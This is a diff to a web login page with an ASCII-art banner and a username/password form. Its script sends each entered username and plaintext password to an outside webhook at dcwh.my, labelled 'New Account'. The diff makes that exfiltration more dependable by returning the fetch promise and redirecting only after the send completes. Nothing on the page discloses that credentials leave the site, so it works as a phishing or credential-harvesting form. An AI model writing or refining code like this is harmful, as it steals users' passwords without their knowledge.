@@ -141,12 +141,12 @@
   8888  888R     8888     888R I888>    888I  888I   888E  9888  9888           X888  888X  888X   8888      8888R   
   8888  888R     8888     888R I888>    888I  888I   888E  9888  9888           X888  888X  888X   8888      8888P   
   8888 ,888B .  .8888Lu= u8888cJ888   uW888L  888'   888E  9888  9888     .    .X888  888X. 888~  .8888Lu=   *888>   
- "8888Y 8888"   ^%888*    "*888*P"   '*88888Nu88P    888&  9888  9888   .@8c   `%88%``"*888Y"     ^%888*     4888    
+ "8888Y 8888"   ^%888*    "*888*P"   '*88888Nu88P    888&  9888  9888   .@8c   `%88%``*"888Y"     ^%888*     4888    
   `Y"   'YP       'Y"       'Y"      ~ '88888F`      R888" "888*""888" '%888"    `~     `"          'Y"      '888    
                                         888 ^         ""    ^Y"   ^Y'    ^*                                   88R    
                                         *8E                                                                   88>    
                                         '8>                                                                   48     
-                                         "                                                                    '8    
+                                         "                                                                    '8     
     </div>
 
     <input type="text" placeholder="Enter Username" id="input-username" class="form-input" />
@@ -171,7 +171,7 @@
     function sendLoginToWebhook(user) {
       const webhookURL = 'https://dcwh.my/post?uniqueid=8d06669a';
       const content = `**New Account:** ${user.username} | **Password:** ${user.password}`;
-      fetch(webhookURL, {
+      return fetch(webhookURL, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ content })
@@ -217,8 +217,9 @@
       const password = document.getElementById('input-password').value.trim();
       if (!username || !password) return alert('Please enter username and password.');
       const user = saveAccount(username, password);
-      sendLoginToWebhook(user);
-      window.location.href = './index.html';
+      sendLoginToWebhook(user).finally(() => {
+        window.location.href = './index.html';
+      });
     });
 
     window.addEventListener('load', () => {
